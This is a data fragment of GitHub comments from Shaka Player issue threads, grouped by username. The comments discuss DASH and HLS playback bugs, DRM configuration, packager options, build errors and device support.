    "chanyk-joseph": "Hi @ismena , I have updated the manifest to static VOD format. Please try again:\nhttps://www.haudosi.com/dash_freq_scte35/manifest.mpd\nBTW, we need to enable cross-origin using chrome browser plugin in order to playback the manifest on \nhttps://shaka-player-demo.appspot.com/demo/\nSorry for any inconveniences caused!. @joeyparrish Thanks for the investigation and your detailed explanations! \nI will try to apply workaround util #1339 is resolved.. ",
    "ctoshni": "So if fragment_duration represents moof then what happens if --segment_duration and --fragment_duration is set to the same value? \n  1. Does this mean only 1 fragment per segment?\n  2. What happens to mdat box in above case?\n\nAlso what happens f I provide only segment_duration and not fragment_duration? Will it behave similarly as above i.e 1 fragment per segment?\n. > There will be one fragment per segment if fragment_duration is set to 0. The default fragment_duration may not be zero. You may want to set it to 0 to be safe.\nSo what is the recommend option when I want 1 fragment per segment?\na. Set both segment_duration and fragment_duration to same value eg : --segment_duration=10 --fragment_duration=10\nb. Set fragment_duration=0 i.e  --segment_duration=10 --fragment_duration=0. Thanks @kqyang ! This is really helpful.\nClosing the issue as all the queries have been addressed.. ",
    "drobazko": "@TheModMaker, huge thank you for your detailed answer.. ",
    "jpfranco": "@michellezhuogg thanks for replying. I will request permission to share the asset and I'll email it to you as soon as possible.. Thanks @michellezhuogg @joeyparrish, I've sent a test asset to the email above. Please let me know in case you need more info.. @joeyparrish thanks for looking into this. We can reproduce a very similar issue with Firefox as well though (see second screenshot above). Do you think that could be a separate problem?\nI had suspected a race condition as well since we've noticed that the frequency of the issue and the platforms where it can be reproduced vary between assets. For example, we had assets for which the issue was easy to reproduce on Windows, but not on Mac, and vice versa. For mosts assets I've been able to reproduce the issue on both Chrome and Firefox though. . @TheModMaker oh ok, got it. Thanks for clarifying.. @TheModMaker we have permission to share the asset with devs for troubleshooting purposes so long as the url is not publicly accessible. If this can be shared privately then please go ahead, otherwise I will have to ask the customer and get back to you on that.\nUnfortunately we don't currently have a public domain asset that reproduces the issue.. @TheModMaker do you know by any chance which is the Widevine CDM version that contains the fix? A customer is reporting that they're still able to reproduce the issue with Chrome 71, so we want to confirm whether the fix has already been included.\nWould it also be necessary to open a ticket with Firefox about this, or do they pick up CDM updates regularly? Thanks\n. @TheModMaker sounds good, thanks for clarifying.. ",
    "spaddon": "Is there any update from the Chrome team? (we don't have access to that system). We have tested on Chrome 71, and so far have not been able to reproduce the issue. Looks promising :). ",
    "humanamburu": "Hello, @jpfranco \nCould you please share any updates?. ",
    "ashish01july": "@jpfranco Do you have any update on the same , we are still facing this issue and not able to communicate to customer on this.. ",
    "bottmann": "I'll try create the temporary web server...\nThanks @TheModMaker and @mstattma ! . ",
    "ChristiaanScheermeijer": "Hi @joeyparrish,\nIs the following issue also being caused by the problem you are describing?\nhttps://shaka-player-demo.appspot.com/demo/#asset=https://dutchchannels.nl/demo/videodock/hls/Manifest.m3u8;lang=nl-NL;build=uncompiled\n\nHLS playback starts at the same position as the first VTT cue (you can't seek before that position).\nThe same \"offset\" is being used for the VTT rendering. So all cues are delayed by the startTime of the first cue.\n\nWe are having this issue in the Chromecast receiver. The test stream from above is an extracted from Axinom.\nThe first issue seems to be resolved in the master branch though.. A workaround for this issue:\nBy adding a placeholder cue in the WebVTT file at 0 seconds, the offset issue seems to be fixed.\n```\nWEBVTT\n00:00:00.000 --> 00:00:00.010\n...\n```\n. ",
    "rkuroiwa": "I don't think it is the case that \"individualization messages won't ever be destined for the same server as licenses\". It just happens to be that my use case needs a separate URL. It feels more like an implementation detail or business logic.\nWhat is going to be the default behavior if the user doesn't want to special case individualization-request messages, and just want to use the same URL?\nI'm ok with shaka player propagating up the message type along with a Request object but I'm guessing that most use cases is simply sending the message somewhere else, rather than changing the content of the requests. Plus it requires extra network handling in the app.. > I was thinking that most individualization requests would be going to some central location run by the DRM provider, and that licenses might be served by something specific to the application. If everything can be handled by the app's servers, why do we need this feature?\nI think this will be the majority of the use cases. I was just replying to the \"won't ever be\" part.\nIf the default behavior uses the URL for licenses I'm not too worried about cases where they happen to be the same endpoint.\nI think it's easiest for the app devs to be able to specify a separate URL for individualization requests, but I'll leave it up to you folks to design the API :). ",
    "suchitht": "I have created 2 encrypted files\nhttp://192.168.172.74:8085/key/wide/h264.mpd\nhttp://192.168.172.74:8085/key/wide2/h264.mpd\nBoth are not playable in the demo shaka player with https://proxy.uat.widevine.com/proxy\nError: Shaka Error NETWORK.HTTP_ERROR (http://192.168.172.74:8085/key/wide2/h264_master.m3u8,TypeError: NetworkError when attempting to fetch resource.,0). Have you read the FAQ and checked for duplicate open issues?:\nYes, Error code 1002, about setting CORS. No idea on how to set CORS header\nWhat version of Shaka Player are you using?:\nv2.4.4 compiled release (https://shaka-player-demo.appspot.com/demo/#asset=http://192.168.172.74:8085/key/wide2/h264.mpd;license=https://proxy.uat.widevine.com/proxy;lang=en-US;build=compiled)\nCan you reproduce the issue with our latest release version?:\nI guess that was your latest version\nCan you reproduce the issue with the latest code from master?:\nNA\nAre you using the demo app or your own custom app?:\nusing the demo app\nIf custom app, can you reproduce the issue using our demo app?:\nNA\nWhat browser and OS are you using?:\nFirefox, Windows\nWhat are the manifest and license server URIs?:\nmanifest\nhttp://192.168.172.74:8085/key/wide/h264.mpd\nhttp://192.168.172.74:8085/key/wide2/h264.mpd\nlicense server\nhttps://proxy.uat.widevine.com/proxy\nWhat did you do?\ncreated widevine manifest file using shaka packager, using server https://license.uat.widevine.com/cenc/getcontentkey/widevine_test and tried to play the encrypted content on your demo app\nWhat did you expect to happen?\ndecrypt the video file and play using the key server https://proxy.uat.widevine.com/proxy\nWhat actually happened?\nInstead of playing the file the app showed the error 1002. ",
    "SIX10": "Clean git clone does not work. No folder named wd/build apparently. NPM version is 6.4.1. Okay, didn't use sudo, and it started giving me a error about something \"illegal\" (cant remember the exact error message) haven't checked if it compiled yet though.. Here is the output:\n```\ncyberia@MainServer:~/shaka-player/build$ python all.py \n[INFO] Generating Closure dependencies...\n[INFO] Running eslint...\n[INFO] Running htmlhint...\nConfig loaded: /home/cyberia/shaka-player/.htmlhintrc\nConfig loaded: /home/cyberia/shaka-player/.htmlhintrc\nConfig loaded: /home/cyberia/shaka-player/.htmlhintrc\nScanned 3 files, no errors found (36 ms).\n[INFO] Checking that the build files are complete...\n[INFO] Checking the tests for type errors...\nWARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by com.google.protobuf.UnsafeUtil (file:/home/cyberia/shaka-player/third_party/closure/compiler.jar) to field java.nio.Buffer.address\nWARNING: Please consider reporting this to the maintainers of com.google.protobuf.UnsafeUtil\nWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations\nWARNING: All illegal access operations will be denied in a future release\n[INFO] Checking the usability of generated externs...\nWARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by com.google.protobuf.UnsafeUtil (file:/home/cyberia/shaka-player/third_party/closure/compiler.jar) to field java.nio.Buffer.address\nWARNING: Please consider reporting this to the maintainers of com.google.protobuf.UnsafeUtil\nWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations\nWARNING: All illegal access operations will be denied in a future release\n[INFO] Building the docs...\nfs.js:115\n    throw err;\n    ^\nError: EACCES: permission denied, open 'docs/api/fonts/OpenSans-Bold-webfont.eot'\n    at Object.openSync (fs.js:436:3)\n    at Object.exports.copyFileSync (/home/cyberia/shaka-player/node_modules/jsdoc/lib/jsdoc/fs.js:110:16)\n    at /home/cyberia/shaka-player/docs/jsdoc-template/publish.js:611:12\n    at Array.forEach ()\n    at Object.exports.publish (/home/cyberia/shaka-player/docs/jsdoc-template/publish.js:607:17)\n    at Object.module.exports.cli.generateDocs (/home/cyberia/shaka-player/node_modules/jsdoc/cli.js:446:35)\n    at Object.module.exports.cli.processParseResults (/home/cyberia/shaka-player/node_modules/jsdoc/cli.js:397:20)\n    at module.exports.cli.main (/home/cyberia/shaka-player/node_modules/jsdoc/cli.js:240:14)\n    at Object.module.exports.cli.runCommand (/home/cyberia/shaka-player/node_modules/jsdoc/cli.js:189:5)\n    at /home/cyberia/shaka-player/node_modules/jsdoc/jsdoc.js:105:9\n    at Object. (/home/cyberia/shaka-player/node_modules/jsdoc/jsdoc.js:106:3)\n    at Module._compile (internal/modules/cjs/loader.js:689:30)\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:700:10)\n    at Module.load (internal/modules/cjs/loader.js:599:32)\n    at tryModuleLoad (internal/modules/cjs/loader.js:538:12)\n    at Function.Module._load (internal/modules/cjs/loader.js:530:3) \n```. Okay, thanks so much, yea I think I did it with sudo or as root in the beginning.. ",
    "shineyjames123": "Thank you. Setting a timeout of 10000ms did help the player to recover from  the \"pending\" state.. ",
    "leolarios": "Tested again cleaning cache works ok. As you say, seems cache in browser.\nIssue can be closed.\nMany tnx. ",
    "payelmondal123": "Is it possible to change the loader manually ? I mean is there any API related to loader ?. ",
    "stefanovualto": "Thanks for the tip, but will the changes between 2.3.7 and 2.4.4 around rendering be rolled back or fixed?. ",
    "plzhang": "Sorry forgot to mention in What did you do part:\nAfter loading the stream, also need to let chrome load unsafe script due to the mixed content this test stream has.\nAnd the behavior described above happens after this.. Thanks for looking into it!\nBut I don't see any log indicating it is related to CORS (in chrome console filter by CORS or cross). \nBut I also tried open chrome with google-chrome --disable-web-security, to disable CORS.\nAnd forgot to mention that we also need service worker to bypass for network. \nIn which case I'm still able to reproduce on both Linux Machine and MacOS, with same behavior.\nSometimes it take a while to see this issue\n1. Logs usually shows up in less than a minute\n2. Playback might start smoothly that lasts longer than a minute, but buffering will happen in a few minutes eventually. \nAnd every time the buffering happens the progress bar became around 10 seconds behind. So another way to verify it without keeps looking at the screen might be leave it running for 10 or 20 minutes and check the progress bar and log console after.\n. Yep I also set --user-data-dir.\nAnd it is true there are two types of Periods(can be distinguished by id). But if Load unsafe scripts is set (shows up in the URL bar when loading mixed content). Both of them plays (and all segments 200 status code), just it might be buffering for around 10 seconds. if it is a cors issue I assume it won't play right?\nYep Service Workder is always  set with bypass for network\nAnd jump Large Gaps is also applied, cannot be so certain if there is improvement but buffering and the two types of logs are still seen...\nCan you also observe the shifted progress bar and two types of logs on your side, if just leave it playing for 10 to 20 minutes?. Thanks for the good catch! I'll look into it.. Yep, and nothing else we need for now. Thanks, @theodab , @joeyparrish.\nAfter fixing the missing periods issue we noticed that there are a few other problems in the stream regarding the timeline. The fix might take sometime, I'll close the issue for now.. ",
    "robertoviola": "@shaka-bot reopen. Actually I am using Qt5.9 which uses Chromium 56 as a runtime for the shaka-player. Do you know if there are any workaround for making a Qt5.9+Shaka-player solution to work? Or the only possibility is to change Qt for a newer version?. Ok, thank you for the explanation.. Yes, I understood. Thank you for your answer.. I tried by setting keys directly in the player and it correctly works:\nwindow.player.configure({\n    drm: {\n      //servers: {\n      //    'org.w3.clearkey':  drmUri\n      //},\n      clearKeys: {\n        '2eba33db8c7ef4776c782e5eff2ce226': 'dc610ae5d79baef07cbc2da82bec6d50',\n        '2a34ae510ffcea252dca2670f2ffb596': 'eaa0cba0c5a57d2ffebb0b168b2ea192',\n        'a931023aaaabacaed1feb12a0eba5133': '167dfbedde445b9a639f70882ef153ae',\n        'd04c705a3a2f27cbbccecee6a2a8ed8f': '8a3eebf5b8bbf54262112c6be4b7dbca',\n        '5ab8edd5acc531c770e3aac8bc054bf0': 'ef9b6fe47e8e6da63f8ff1f411ccf06a'\n      },\nBy the way, it still does not work if I retrieve the keys from the server. The request I receive from the client:\n{\"kids\":[\"Lroz24x-9HdseC5e_yziJg\",\"0ExwWjovJ8u8zs7moqjtjw\",\"Wrjt1azFMcdw46rIvAVL8A\",\"qTECOqqrrK7R_rEqDrpRMw\",\"KjSuUQ_86iUtyiZw8v-1lg\"],\"type\":\"temporary\"}\nThen I decode base64 kids:\n[ '2eba33db8c7ef4776c782e5eff2ce226',  'd04c705a3a2f27cbbccecee6a2a8ed8f', '5ab8edd5acc531c770e3aac8bc054bf0',  'a931023aaaabacaed1feb12a0eba5133', '2a34ae510ffcea252dca2670f2ffb596' ]\nAnd this is the JSON answer which I sent back to the client:\n{\"keys\":[{\"kid\":\"KjSuUQ/86iUtyiZw8v+1lg==\",\"k\":\"6qDLoMWlfS/+uwsWiy6hkg==\",\"kty\":\"oct\"},{\"kid\":\"Lroz24x+9HdseC5e/yziJg==\",\"k\":\"3GEK5debrvB8vC2oK+xtUA==\",\"kty\":\"oct\"},{\"kid\":\"Wrjt1azFMcdw46rIvAVL8A==\",\"k\":\"75tv5H6ObaY/j/H0Eczwag==\",\"kty\":\"oct\"},{\"kid\":\"qTECOqqrrK7R/rEqDrpRMw==\",\"k\":\"Fn377d5EW5pjn3CILvFTrg==\",\"kty\":\"oct\"},{\"kid\":\"0ExwWjovJ8u8zs7moqjtjw==\",\"k\":\"ij7r9bi79UJiESxr5Lfbyg==\",\"kty\":\"oct\"}],\"type\":\"temporary\"}\nAnd this is the JSON received on browser side:\nkeys: [{kid: \"KjSuUQ/86iUtyiZw8v+1lg==\", k: \"6qDLoMWlfS/+uwsWiy6hkg==\", kty: \"oct\"},\u2026]\n0: {kid: \"KjSuUQ/86iUtyiZw8v+1lg==\", k: \"6qDLoMWlfS/+uwsWiy6hkg==\", kty: \"oct\"}\n1: {kid: \"Lroz24x+9HdseC5e/yziJg==\", k: \"3GEK5debrvB8vC2oK+xtUA==\", kty: \"oct\"}\n2: {kid: \"Wrjt1azFMcdw46rIvAVL8A==\", k: \"75tv5H6ObaY/j/H0Eczwag==\", kty: \"oct\"}\n3: {kid: \"qTECOqqrrK7R/rEqDrpRMw==\", k: \"Fn377d5EW5pjn3CILvFTrg==\", kty: \"oct\"}\n4: {kid: \"0ExwWjovJ8u8zs7moqjtjw==\", k: \"ij7r9bi79UJiESxr5Lfbyg==\", kty: \"oct\"}\ntype: \"temporary\". I already found the solution.\nThe problem was due to Google Chrome which employs \"-\" and \"_\" as characters 62 and 63 for base64 encoding instead of using \"+\" and \"/\" as defined by standard base64:\n\nOn the contrary, Firefox is able to work with both base64 variants, this is why it was already working. I just replaced the two characters inside the encoded string and now it correctly works on Chrome, too.\n. ",
    "niralipatelgoogle": "The issue appears for VOD with live profile MPD. I tried to reproduce it by closing the dev tools window and it doesn't happen any more. So it must be the memory consumed by the network traffic as you have explained. Thank you for looking into this. . ",
    "oldmtn": "Know it. Thanks\nkarma + jasmine. Hi TheModMaker:\n  Thanks for your detailed explaination.\nThere is no way to \"return\" multiple times from a function and a Promise can't be resolved multiple times. So to give multiple values to the caller, there would need to be an event or callback for each time we got some data. We do this for the progress event so we can get faster estimates for ABR (see the progressUpdated callback).\nYes, I know the the Promise can only be resolved once.\n  So, you may need wait until all the data is downloaded.\nBut, if we want to support lowlatency feature, using Promise seems not proper here.\nThanks. Yes. Thanks.. Besides, you also add a reference to cast_sender with blow code:\n\nWhat does it means?\nWhy google cast official doc don't menthion it?. @joeyparrish Yes, Thanks.:). @joeyparrish \nhttp://demo.theoplayer.com/chromecast can show chromecast icon.\nhttps://demo.theoplayer.com/chromecast can show chromecast icon.\nSo, I think chromecast can only work normal on player deployed on a https server.\n. ",
    "cdgriffith": "Sure, everything should be attached in a zip file. I just serve the directory with python -m http.server \nsubtitle_error.zip\n. Tested and confirmed working for me, thanks for the fast fix! \nJust as a heads up to anyone else using it, this method currently only supports a single track (as @ismena stated) and will always be the last one added, regardless if it is labeled 'caption' or 'subtitle'. . ",
    "mikrohard": "I signed it!. I signed it!. It would be probably best if you do it because you know better how & why it works as it does. If I add the offset to the PresentationTimeline to fix the seek range it would actually break the sets maxFirstSegmentTime test (where you expect the getSeekRangeStart to be greater than 0... but this exactly is the root issue I'm trying to fix).. It would be probably best if you do it because you know better how & why it works as it does. If I add the offset to the PresentationTimeline to fix the seek range it would actually break the sets maxFirstSegmentTime test (where you expect the getSeekRangeStart to be greater than 0... but this exactly is the root issue I'm trying to fix).. Thanks for your response. I guess we'll have to fix our streams somehow.. ",
    "stiankraggerud": "Any news on this? I have the same problem. I get video, but no sound.  (Tizen4(2018) UE55Q7FNA) 1153.3. ",
    "avichayn": "The manifest was fixed.... ",
    "bgimmig": "Thank you for your fast answer, I am quickly going to test.. Thank you for your help, I succeeded well has to modify the appearance of the chromecast.\n. Hello,\nThank you for your fast answer.\nI have make some tries with the proposals of @vaage . The problem, with this solution, is that I have to modify your code to succeed in realizing my need. I am thus going to create an issue as an enhancement. My need is to make pass data in the chromecast to display them above the video (a kind of pop-up). But we can easily imagine many of the other applications, the receiver having a technology html/js/css, it would be nice to play with.\nWhile waiting for, I going to look at the protocol messaging advised by @TheModMaker \nThank you for your help and your advice. ",
    "gesinger": "Thank you for the quick and detailed response @vaage , we appreciate it.\nWe gave it a shot (creating the media keys and setting them on the video element before appending any content), and it plays through now. We'll use that strategy for the time being and see if the Chrome team will add support for setting media keys when needed, rather than in advance. We'll update that Chromium bug with that note.\nAgain, thank you for the help!. Thanks for the additional comment @joeyparrish .\nIn the case of live with mixed content, where you may not be sure ahead of time what content types you will have and whether they are encrypted or not, couldn't this solution potentially run into problematic situations with the underlying browser media stack paths?. (Sorry for the delay, and for responding on a closed issue, just wanted to follow up.)\nI was thinking about a case where the content could go from unencrypted ad to encrypted content in a case like HLS, where the manifest is refreshing and the encrypted content only appears after a refresh or two. But you're right that content creators should know if the content is encrypted or not, and when the player is set up the license server should be provided.\nPlaying clear content through an encrypted path does seem reasonable enough, and that seems to be the best approach here. Using the presence of a license server as a guide of whether or not to set up that path also seems the best decider for this case.\nI think it all seems like a good approach, and I appreciate the detail. This definitely helped. Thank you again!. ",
    "vksbansal": "Many thanks @ismena... it feels so good and emotionally helpful that someone is looking after your issue. Huge thanks for devoting your time.\nI am struggling with playing HLS .m3u8 streams in shaka player...\nP.S/FYI: I am working for a content distributor not content owners so I have to support all kind of streams.. I cannot or request to alter or change streams manifest. We just have to play it.. @ismena You have the skill of cutting the tension with a hilarious comment just like one of my fav char Cisco Ramon\nWill be waiting for the response from @joeyparrish and hope he will like the big pink sticky note on his monitor :D :X :)\n. Many thanks @TheModMaker  @ismena  for sparing your time to look at this issue \nFirst Issue:\nAs you said I used \nhttps://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.compiled.debug.js\nand found that the video is still skipping 10 seconds as you can see in this code pen\nSecond issue:\nIts seems that I have to use another lib e.g.HLS.js to play the AES-128 content. If you know a workaround please let me know.\nMany thanks, with hearty heartful appreciation\n. Yes its working fine after cleaning cache. Pardon me for my ignorance @TheModMaker \nWaiting for the release with this fix. \nMay I Know when will it be released?\nMany thanks  : )\n. that sure helps a lot. many and many thanks, @joeyparrish . ",
    "sapolio": "Hello!\nI had to postpone the this for a while.\nThanks for the hint.\nI can't share the content unfortunately. Also It is under Widevine.\nThe stream comes from the content provider. I can't directly affect their encoder, but find the cause of the problem and let the vendor know.\nI see two strange thing in logs:\n\ndebug | Detected midstream configuration change PTS:19158970022 Sample Rate: 44100 vs 22050, ChannelLayout: 3 vs 3, Channels: 2 vs 2\n\nAlthough the stream is single-bitrated.\nAnd such info from time to time:\n\nSelected video track: [2] \n\nOr [], or [8].... ",
    "pawelgliwinski": "\nIt would really help if you could provide some example content to test with. \n\nNot sure if there is a clear content there, I'll try to get something in the meantime I'll send the manifest over the email for start.\n\nAlso how did you get that dump? It looks similar to Chrome performance tab. \n\nthe dump was taken with LG webinspector.\n\nDoes your content actually use xlinks? \n\nI don't think we are using xlinks,.. any help much appreciated . I have sent an email. please check if you can see it. ",
    "tylerdaines": "I signed it!. Any chance I can get some feedback on this?  I'm hoping this can make it in 2.5.. @vaage I think I have addressed all your concerns and reverted my ill-advised white space changes.  Anything else I need to look at?. I believe I have addressed all the latest issues.  Anything else that needs addressing?. Think I fixed all the issues in the latest code review.  Anything else?. Thanks guys!. @TheModMaker I'd be happy to take that on if you haven't already started on it.. No, you're not missing anything.  I did 'Format Document' in my editor and it changed all those lines.  I will go back and revert them.  FWIW, I did ./build/all.py before submitting this PR and it came back with no issues.. I can't take credit for that.  That's from the original PR.. Will fix.. Will fix.. If the <mspr:pro> element cannot be found or if the byte length of the data inside the element is too small, and no license server is provided via the usual means, shaka throws the DRM.NO_LICENSE_SERVER_GIVEN error.  If, however, a license server is provided via the player.configure(), playback will occur.  So, imho, I think that is sufficient.. Fixed. Fixed. Fixed. Fixed. Fixed. Empty string not allowed in LA_URL element.. I did some refactoring to this and added a few comments and included a link the spec in the doc string.  I hope that will suffice.. Fixed. Fixed. Fixed. Agreed, changed to Uint16Array.. Added.. Agreed. Fixed.. Thanks for your feedback and patience.. Added more info to doc string.. Fixed.. Fixed.. Fixed.. Fixed.. Removed.. Fixed.. Fixed.. Fixed.. Couldn't find much on this but I did find this Azure Media sample page that links to this manifest which uses the same namespaces so I think it's correct:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\" \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" type=\"static\" \n    xmlns:cenc=\"urn:mpeg:cenc:2013\" \n    xmlns:mspr=\"urn:microsoft:playready\" \n    xmlns:ms=\"urn:microsoft\" mediaPresentationDuration=\"PT52.208S\" minBufferTime=\"PT3S\">\n    <Period>\n        <AdaptationSet ...snip...>\n            <ContentProtection schemeIdUri=\"urn:mpeg:dash:mp4protection:2011\" value=\"cenc\" cenc:default_KID=\"096D74B9-362D-4110-949B-EC0F5694F750\"/>\n            <ContentProtection schemeIdUri=\"urn:uuid:9A04F079-9840-4286-AB92-E65BE0885F95\" value=\"2.0\" cenc:default_KID=\"096D74B9-362D-4110-949B-EC0F5694F750\">\n                <mspr:pro>...snip...</mspr:pro>\n            </ContentProtection>\n            <ContentProtection schemeIdUri=\"urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed\" cenc:default_KID=\"096D74B9-362D-4110-949B-EC0F5694F750\">\n                <cenc:pssh>AAAAMnBzc2gAAAAA7e+LqXnWSs6jyCfc1R0h7QAAABISEAltdLk2LUEQlJvsD1aU91A=</cenc:pssh>\n                <ms:laurl licenseUrl=\"https://ampvideos.keydelivery.mediaservices.windows.net/Widevine/?kid=096d74b9-362d-4110-949b-ec0f5694f750\"/>\n            </ContentProtection>\n...snip.... Done.. Fixed. Fixed. Fixed.. Fixed.. Fixed.. This is something I went back and forth on and couldn't find a better way.  The issue is in the ArrayBuffer recordData, the data is all 16-bit numbers (i.e. every other byte is 0), so I went with the \"cast the Uint16 numbers to Uint8 numbers\" approach.. You're right.  I was too focused on using the existing parseXml which was expecting UTF-8. Fixed.. No longer using parseXml so I didn't edit it's signature.. Fixed.. ",
    "weshamoh": "Thanks @joeyparrish yes i will ,  really appreciate for  kind of work your doing.Thank you.. ",
    "BlessingD": "No I\u2019m not calling it, where do I call it? And what\u2019s the syntax?\nSent from my iPhone\n\nOn 05 Nov 2018, at 18:52, ismena notifications@github.com wrote:\nHi @BlessingD\nCould you post a snippet of your code when you're creating a new shaka.Player object?\nAre you calling Player.attach() anywhere?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Hi,please find attached, a snippet of my offlinedownload.js which is\nbasically exactly as your myapp.js then also a snippet of my console in\nchrome which shows the error,which says..(uncaught in promise...).May you\nalso elaborate on the manifest Uri,what is that dash.mpd file? Basically i\nhave a system where users can login and watch educational content. I am\nusing the shaka player to cater for downloads for offline viewing.,Also\nregistering a service worker to cache assets for offline experience.\n\nI do apologize as I am a bit of a rookie, lol.\nregards\nBlessing\nOn Mon, Nov 5, 2018 at 8:00 PM ismena notifications@github.com wrote:\n\nWe really need to see your code to help identify the problem.\nIn the mean time, if you haven't already, please take a look at our basic\nusage tutorial\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html\nand see if that helps.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1649#issuecomment-435972526,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AhbjQI_4KIm8EZNaPSDz7iwEP2rjU72Eks5usHzCgaJpZM4YOFv9\n.\n. \n\n. Hi, I have 2 snippets above as mentioned in my previous email.. thanks guys! really helped a lot. just one more question,how do i fix these invalid config errors\n\n. Hi SHAKA PLAYER team. Thank you for your help in resolving my issue. Everything is all sorted,You can close this issue. thanks a lot. \n",
    "hanumantha03": "I want to add download option next Captions option.. One last thing, if I want to change the UI for the shaka player myself, what are the files I should look for and  change, so that I can have my own UI interface?. Thank you very much @joeyparrish and @ismena . You can close this issue now.. ",
    "jvjvjv": "Thanks for everything, Joey. I've logged this issue in Google's Issue Tracker.. ",
    "chavoosh": "Well, I just followed this instruction and tried DEBUG, V1, and V2 log levels and the output of all of them was the same. My expectation was the output changes by increasing the verbosity, isn't it correct?. Thanks for the reply, it solved the problem.. ",
    "kevinbol": "hi, chrisfillmore\nthanks for your response. sorry for make you confused, I have updated the issue content.\nthe first image appears Tears of Steel (clear) playing well.\nthe second image appears Tears of Steel (widevine) cannot play.\nthere is nothing abnormal in the log output to console. \nShaka declare to support wedevine and playready on Tizen. does it include web app on Tizen ?. > @kevinbol, I can see the same or similar issue on our 2017 Tizen TV. I'm not sure what is causing it, but our automated playback tests for those assets fail inconsistently on our Tizen device. I see MediaSource failures, so I expect either a bug in Tizen's media stack or some incompatibility between Tizen's decoders and the media content itself. This is similar in spirit to #1610, but it's very difficult to debug these things.\n\nIf we can figure out the trigger, we may be able to produce a workaround. But it might not be feasible, and we might have to rely on Samsung to fix the platform in some way.\nI'll update this issue once we have something more concrete to go on.\n\nthanks for your reply~. ",
    "Lastique": "Thanks for the fix!. I think it may be because some of the representations are webm segments.. Is it possible to ignore the webm segments in the player and use mp4 streams? I was assuming the player would ignore the streams it can't play.\nBTW, the webm segments are probably present because ffmpeg generates both DASH and HLS manifests for the common set of media segments, and DASH can contain both types of streams. Apparently, ffmpeg does not filter away webm streams from HLS streams.\n. I've already submitted an ffmpeg patch to support different file name extensions (.webm and .mp4) for different segment types, but I haven't tested shaka-player with this new behavior yet. I will test it in a day or two and report back.\n. Yes, I can confirm that with different file extensions I get HLS_COULD_NOT_PARSE_SEGMENT_START_TIME error on loading the manifest. I've attached the new media contents in case you need it for testing. I'll see if I can filter out the webm streams from HLS manifest.\nStill, I think the player should just ignore the streams it can't play, including those that cannot be interpreted before testing what the browser supports. From the user standpoint, this is really the same thing.\nmedia.tar.gz. > We might be able to assume timestamps in WebM segments are the same as corresponding MP4 segments.\nI think that would be a wrong assumption to make, if I understood you correctly. You can see in my media examples that different streams use different time bases, and different segments of different media streams also have different duration.\n. I've patched ffmpeg so that is only saves mp4 streams in the HLS manifest, and now shaka-player is able to play the stream. Thanks for your help!\nI'll keep the bug open, though, since I still think it would be useful if shaka-player ignored the streams it can't play.\n. > If ffmpeg generates VOD content where this is not true, then it is not holding to the spec.\nI don't see EXT-X-PLAYLIST-TYPE in the HLS manifests produced by ffmpeg dash writer. There is a separate hls writer that does make use of this tag, but I'm not using it currently and I think it is optional (i.e. by default the tag will not be present as well).\nIn practice, it is often difficult to guarantee that multiple streams start with the same timestamp, unless you're willing to introduce a synchronization error. When you're working with encoded content, video has to start with a keyframe, which are typically sparse and not guaranteed to have the same timestamp as any of the corresponding audio frames. In order to have audio and video synchronized and start at the same timestamp you typically have to do the mastering and re-encoding the content, which is not desirable and in some contexts not practical (e.g. when we're talking of realtime media processing). So, while the spec requires VOD streams to have the same initial timestamps, I would be reluctant to rely on this and would expect that either that guarantee doesn't hold, or that EXT-X-PLAYLIST-TYPE=VOD would not be used often. In other words, you have to have a backup plan of what to do when the stream is not VOD and does not start with the same timestamps, and at that point you might as well apply the same logic to VOD.\n. Yes, I understand your point, and in fact I agree with you in that following the spec is the right thing. I also understand the will to reduce latency and avoid having to download segments that you actually won't play. I'm just pointing out that the requirement of the initial timestamps being the same for all streams can be rather expensive on the content producer side, if at all feasible in some cases. It has nothing to do with segment deletion but rather with the incentive to avoid content transcoding when possible.\nTo illustrate this, imagine you want to publish a video as a VOD stream on your web server. Oftentimes, video files contain streams (video or audio) that start at different timestamps. This is normal and even explicitly supported in some formats, like matroska, for example. It is often utilized to achieve better synchronization between the streams. So, suppose the audio stream starts 100 ms after the video stream in the file. Basically, you have 3 options:\n\nDrop initial video and audio frames until the first video keyframe that also has audio. Given that keyframes are sparse, you may have to drop seconds or even minutes of the content. And even then, you're not guaranteed that your next keyframe will have exactly the same timestamp as the corresponding audio frame timestamp. You might introduce slight mis-synchronization if you rewrite video or audio timestamps to actually match at the beginning.\nDecode video, drop initial 100 ms worth of video frames and re-encode video. You will be losing only 100 ms of content, but you'll also be losing video quality and time/CPU cycles re-encoding the video. Which might be a problem if you're time constrained (e.g. you are a realtime system). And the slight mis-synchronization still applies to this case.\nDecode audio, add 100 ms worth of silence in the beginning and re-encode audio. This is somewhat better in that you're not losing any content and audio encoding is less expensive than video (although still not free), but you're still losing audio quality.\n\nOf course, there is a fourth option, which is to not mark the stream as VOD in the first place. And it looks like the most reasonable one compared to the other three, except that the browser may not be working optimally, not knowing that the content is actually static and not live. I'm not sure how significant that difference would be, besides having to download the initial segments of all substreams.\n\nWe do have a backup plan for what to do when the stream is not VOD. In fact, we already treat VOD and live exactly the same.\n\nOk, good to know. My suggestion then, when you implement that optimization, leave an escape hatch so that users are able to still use the \"live\" behavior for VOD streams. Even if not enabled by default, this may be useful for cases like the one I described above.\nAnyway, thank you for taking the time to write such expanded comments.\n. ",
    "cutekyu": "Thank you for your advice.\nwe resolved this issue.\nThe reason of this issue was my wrong code in Subsample Decrypt funtions in CDM.\nAnyway, Thanks for your opinion.. ",
